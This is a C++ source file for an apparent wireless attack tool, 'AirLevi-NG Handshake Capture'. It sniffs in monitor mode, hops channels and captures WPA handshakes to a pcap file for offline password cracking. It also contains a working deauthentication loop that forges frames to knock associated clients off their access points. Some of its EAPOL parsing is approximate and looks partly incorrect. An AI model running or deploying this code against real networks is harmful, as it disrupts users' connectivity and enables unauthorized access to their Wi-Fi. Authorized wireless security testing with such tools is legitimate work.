#include "airlevi-handshake/handshake_capture.h"
#include <iostream>
#include <cstring>
#include <unistd.h>
#include <iomanip>
#include <algorithm>

// Radiotap header structure (simplified)
struct radiotap_header {
    uint8_t it_version;
    uint8_t it_pad;
    uint16_t it_len;
    uint32_t it_present;
};

HandshakeCapture::HandshakeCapture()
    : pcap_handle(nullptr), pcap_dumper(nullptr), running(false),
      channel_hopping_enabled(true), dwell_time_ms(250), deauth_attack_enabled(false),
      deauth_packets_per_burst(5), deauth_burst_interval_ms(2000), current_channel(1),
      packets_processed(0), deauth_sent(0) {

    // Initialize channels for 2.4GHz and 5GHz
    for (int i = 1; i <= 14; ++i) channels.push_back(i);
    std::vector<uint8_t> ghz5_channels = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
    channels.insert(channels.end(), ghz5_channels.begin(), ghz5_channels.end());
}

HandshakeCapture::~HandshakeCapture() {
    stopCapture();
    if (pcap_dumper) pcap_dump_close(pcap_dumper);
    if (pcap_handle) pcap_close(pcap_handle);
}

bool HandshakeCapture::initialize(const std::string& interface, const std::string& output_file) {
    this->interface = interface;
    this->output_file = output_file;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_create(interface.c_str(), errbuf);
    if (!pcap_handle) {
        std::cerr << "[-] pcap_create() failed: " << errbuf << std::endl;
        return false;
    }

    pcap_set_snaplen(pcap_handle, BUFSIZ);
    pcap_set_promisc(pcap_handle, 1);
    pcap_set_timeout(pcap_handle, 1000);
    pcap_set_rfmon(pcap_handle, 1);

    if (pcap_activate(pcap_handle) != 0) {
        std::cerr << "[-] pcap_activate() failed: " << pcap_geterr(pcap_handle) << std::endl;
        return false;
    }

    pcap_dumper = pcap_dump_open(pcap_handle, output_file.c_str());
    if (!pcap_dumper) {
        std::cerr << "[-] Failed to open output file " << output_file << ": " << pcap_geterr(pcap_handle) << std::endl;
        return false;
    }

    std::cout << "[+] Capture initialized on " << interface << ". Saving handshakes to " << output_file << std::endl;
    return true;
}

bool HandshakeCapture::startCapture() {
    if (running) return false;
    running = true;
    start_time = std::chrono::steady_clock::now();

    capture_thread = std::thread(&HandshakeCapture::captureLoop, this);
    if (channel_hopping_enabled) {
        hopping_thread = std::thread(&HandshakeCapture::channelHoppingLoop, this);
    }
    if (deauth_attack_enabled) {
        deauth_thread = std::thread(&HandshakeCapture::deauthLoop, this);
    }

    std::cout << "[+] Capture started." << std::endl;
    return true;
}

void HandshakeCapture::stopCapture() {
    if (!running) return;
    running = false;

    if (capture_thread.joinable()) capture_thread.join();
    if (hopping_thread.joinable()) hopping_thread.join();
    if (deauth_thread.joinable()) deauth_thread.join();

    std::cout << "\n[+] Capture stopped." << std::endl;
}

void HandshakeCapture::setTargetBSSID(const MacAddress& bssid) {
    std::lock_guard<std::mutex> lock(data_mutex);
    target_bssid = bssid;
}

void HandshakeCapture::setTargetSSID(const std::string& ssid) {
    std::lock_guard<std::mutex> lock(data_mutex);
    target_ssid = ssid;
}

void HandshakeCapture::setChannel(uint8_t channel) {
    setChannelHopping(false);
    current_channel = channel;
    setWifiChannel(interface, channel);
}

void HandshakeCapture::setChannelHopping(bool enabled, int dwell_time_ms) {
    channel_hopping_enabled = enabled;
    this->dwell_time_ms = dwell_time_ms;
}

void HandshakeCapture::setDeauthAttack(bool enabled, int packets_per_burst, int burst_interval_ms) {
    deauth_attack_enabled = enabled;
    deauth_packets_per_burst = packets_per_burst;
    deauth_burst_interval_ms = burst_interval_ms;
}

std::vector<AccessPoint> HandshakeCapture::getAccessPoints() const {
    std::lock_guard<std::mutex> lock(data_mutex);
    std::vector<AccessPoint> result;
    for (const auto& pair : access_points) {
        result.push_back(pair.second);
    }
    return result;
}

std::vector<ClientStation> HandshakeCapture::getClients() const {
    std::lock_guard<std::mutex> lock(data_mutex);
    std::vector<ClientStation> result;
    for (const auto& pair : clients) {
        result.push_back(pair.second);
    }
    return result;
}

std::vector<Handshake> HandshakeCapture::getHandshakes() const {
    std::lock_guard<std::mutex> lock(data_mutex);
    std::vector<Handshake> result;
    for (const auto& pair : handshakes) {
        result.push_back(pair.second);
    }
    return result;
}

HandshakeStats HandshakeCapture::getStats() const {
    HandshakeStats stats;
    stats.packets_processed = packets_processed.load();
    stats.deauth_sent = deauth_sent.load();
    stats.current_channel = current_channel;
    stats.runtime_seconds = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - start_time).count();

    std::lock_guard<std::mutex> lock(data_mutex);
    stats.aps_found = access_points.size();
    stats.clients_found = clients.size();
    stats.handshakes_captured = handshakes.size();
    return stats;
}

void HandshakeCapture::captureLoop() {
    pcap_loop(pcap_handle, -1, [](u_char* user, const struct pcap_pkthdr* header, const u_char* packet) {
        reinterpret_cast<HandshakeCapture*>(user)->processPacket(header, packet);
    }, reinterpret_cast<u_char*>(this));
}

void HandshakeCapture::channelHoppingLoop() {
    size_t channel_index = 0;
    while (running && channel_hopping_enabled) {
        current_channel = channels[channel_index];
        setWifiChannel(interface, current_channel);
        channel_index = (channel_index + 1) % channels.size();
        std::this_thread::sleep_for(std::chrono::milliseconds(dwell_time_ms));
    }
}

void HandshakeCapture::deauthLoop() {
    while (running && deauth_attack_enabled) {
        std::vector<ClientStation> clients_to_attack;
        {
            std::lock_guard<std::mutex> lock(data_mutex);
            for (const auto& pair : clients) {
                if (pair.second.is_associated) {
                    if (target_bssid.isNull() || pair.second.ap_bssid == target_bssid) {
                        clients_to_attack.push_back(pair.second);
                    }
                }
            }
        }

        for (const auto& client : clients_to_attack) {
            for (int i = 0; i < deauth_packets_per_burst; ++i) {
                sendDeauthPacket(client.ap_bssid, client.mac);
                deauth_sent++;
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(deauth_burst_interval_ms));
    }
}

void HandshakeCapture::processPacket(const struct pcap_pkthdr* header, const u_char* packet) {
    if (!running) pcap_breakloop(pcap_handle);
    packets_processed++;

    // Skip radiotap header
    auto rt_header = reinterpret_cast<const radiotap_header*>(packet);
    const u_char* dot11_frame = packet + rt_header->it_len;
    int frame_len = header->caplen - rt_header->it_len;

    if (frame_len < 24) return;

    uint16_t frame_control = *reinterpret_cast<const uint16_t*>(dot11_frame);
    uint8_t type = (frame_control & 0x0C) >> 2;
    uint8_t subtype = (frame_control & 0xF0) >> 4;

    if (type == 0 && subtype == 8) { // Management frame, Beacon
        parseBeaconFrame(dot11_frame, frame_len);
    } else if (type == 2) { // Data frame
        // Check for EAPOL
        if (frame_len > 32) {
            const u_char* llc = dot11_frame + 24;
            if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
                llc[6] == 0x88 && llc[7] == 0x8E) {
                parseEAPOL(dot11_frame, frame_len);
            }
        }
    }
}

void HandshakeCapture::parseBeaconFrame(const u_char* packet, int length) {
    if (length < 36) return;
    MacAddress bssid(packet + 16);
    
    std::lock_guard<std::mutex> lock(data_mutex);
    if (access_points.find(bssid) == access_points.end()) {
        AccessPoint ap;
        ap.bssid = bssid;
        ap.last_seen = std::chrono::steady_clock::now();

        // Extract SSID
        const u_char* tagged_params = packet + 36;
        int remaining = length - 36;
        while (remaining >= 2) {
            uint8_t tag_id = tagged_params[0];
            uint8_t tag_len = tagged_params[1];
            if (remaining < 2 + tag_len) break;
            if (tag_id == 0 && tag_len > 0) { // SSID
                ap.ssid = std::string(reinterpret_cast<const char*>(tagged_params + 2), tag_len);
            } else if (tag_id == 3 && tag_len == 1) { // Channel
                ap.channel = tagged_params[2];
            }
            remaining -= (2 + tag_len);
            tagged_params += (2 + tag_len);
        }
        access_points[bssid] = ap;
    }
}

void HandshakeCapture::parseEAPOL(const u_char* packet, int length) {
    MacAddress bssid(packet + 4);
    MacAddress client_mac(packet + 10);

    std::lock_guard<std::mutex> lock(data_mutex);
    auto it = handshakes.find(bssid);
    if (it == handshakes.end()) {
        Handshake hs;
        hs.ap_bssid = bssid;
        hs.client_mac = client_mac;
        if (access_points.count(bssid)) {
            hs.ssid = access_points[bssid].ssid;
        }
        handshakes[bssid] = hs;
        it = handshakes.find(bssid);
    }

    if (it->second.complete) return;

    // Simplified EAPOL message number detection
    const u_char* eapol_key = packet + 34; // Approx offset
    uint16_t key_info = ntohs(*reinterpret_cast<const uint16_t*>(eapol_key + 1));
    int msg_num = -1;
    if (key_info & 0x0080) { // ACK
        if (key_info & 0x0100) msg_num = 1; // Install
        else msg_num = 3; // Group Key
    } else {
        if (key_info & 0x0100) msg_num = 2; // Pairwise
        else msg_num = 0; // Not a valid handshake message
    }

    if (msg_num >= 1 && msg_num <= 4) {
        if (it->second.eapol_frames[msg_num - 1].empty()) {
            it->second.eapol_frames[msg_num - 1].assign(packet, packet + length);
            std::cout << "[+] Captured EAPOL message " << msg_num << "/4 for " << bssid.toString() << std::endl;
        }
    }

    // Check for completion
    if (!it->second.eapol_frames[0].empty() && !it->second.eapol_frames[1].empty()) {
        it->second.complete = true;
        it->second.timestamp = std::chrono::steady_clock::now();
        if (access_points.count(bssid)) {
            access_points[bssid].has_handshake = true;
        }
        saveHandshake(it->second);
        std::cout << "\n[***] WPA Handshake captured for " << bssid.toString() << " (" << it->second.ssid << ") [***]\n" << std::endl;
    }
}

void HandshakeCapture::sendDeauthPacket(const MacAddress& ap_bssid, const MacAddress& client_mac) {
    uint8_t packet[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // DA = client_mac
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA = ap_bssid
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID = ap_bssid
        0x00, 0x00, 0x07, 0x00 // Reason code
    };
    memcpy(packet + 4, client_mac.bytes, 6);
    memcpy(packet + 10, ap_bssid.bytes, 6);
    memcpy(packet + 16, ap_bssid.bytes, 6);

    if (pcap_sendpacket(pcap_handle, packet, sizeof(packet)) != 0) {
        // std::cerr << "Warning: pcap_sendpacket failed: " << pcap_geterr(pcap_handle) << std::endl;
    }
}

void HandshakeCapture::saveHandshake(const Handshake& handshake) {
    if (!pcap_dumper) return;

    struct pcap_pkthdr header;
    header.ts.tv_sec = std::chrono::duration_cast<std::chrono::seconds>(handshake.timestamp.time_since_epoch()).count();
    header.ts.tv_usec = std::chrono::duration_cast<std::chrono::microseconds>(handshake.timestamp.time_since_epoch()).count() % 1000000;

    for (int i = 0; i < 4; ++i) {
        if (!handshake.eapol_frames[i].empty()) {
            header.caplen = header.len = handshake.eapol_frames[i].size();
            pcap_dump(reinterpret_cast<u_char*>(pcap_dumper), &header, handshake.eapol_frames[i].data());
        }
    }
    pcap_dump_flush(pcap_dumper);
}

bool HandshakeCapture::setWifiChannel(const std::string& interface, uint8_t channel) {
    std::string cmd = "iwconfig " + interface + " channel " + std::to_string(channel) + " >/dev/null 2>&1";
    return system(cmd.c_str()) == 0;
}

void HandshakeCapture::displayStatus() const {
    system("clear");
    HandshakeStats stats = getStats();

    std::cout << "╔══════════════════════════════════════════════════════════════════════════════╗\n";
    std::cout << "║                         AirLevi-NG Handshake Capture                        ║\n";
    std::cout << "╚══════════════════════════════════════════════════════════════════════════════╝\n\n";
    std::cout << "[+] CH " << std::setw(2) << (int)stats.current_channel << " | Runtime: " << stats.runtime_seconds << "s | Packets: " << stats.packets_processed << "\n";
    std::cout << "[+] APs: " << stats.aps_found << " | Clients: " << stats.clients_found << " | Handshakes: " << stats.handshakes_captured << " | Deauths: " << stats.deauth_sent << "\n\n";

    auto aps = getAccessPoints();
    std::cout << "╔══════════════════╦════════════════════════════╦═══════╦═════════════╗\n";
    std::cout << "║      BSSID       ║           SSID             ║  CH   ║ HANDSHAKE   ║\n";
    std::cout << "╠══════════════════╬════════════════════════════╬═══════╬═════════════╣\n";
    for (const auto& ap : aps) {
        std::cout << "║ " << ap.bssid.toString() << " ║ " << std::left << std::setw(26) << ap.ssid.substr(0, 26) << std::right
                  << " ║ " << std::setw(5) << (int)ap.channel << " ║ " << std::setw(11) << (ap.has_handshake ? "Captured" : "-") << " ║\n";
    }
    std::cout << "╚══════════════════╩════════════════════════════╩═══════╩═════════════╝\n";
}
